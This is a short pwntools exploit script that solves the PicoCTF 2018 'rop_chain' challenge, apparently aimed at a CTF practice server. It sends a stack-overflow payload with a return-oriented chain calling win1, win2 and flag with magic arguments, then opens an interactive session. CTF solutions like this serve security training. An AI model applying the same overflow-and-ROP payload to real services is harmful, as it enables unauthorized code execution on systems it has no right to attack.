from pwn import*
#p=process('./PicoCTF_2018_rop_chain')
elf=ELF('./PicoCTF_2018_rop_chain')
p=remote('node4.buuoj.cn',28099)
win1=0x80485cb
win2=0x80485d8
flag=0x804862b

payload=b'a'*(0x18+4)+p32(win1)+p32(win2)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)

p.sendline(payload)

p.interactive()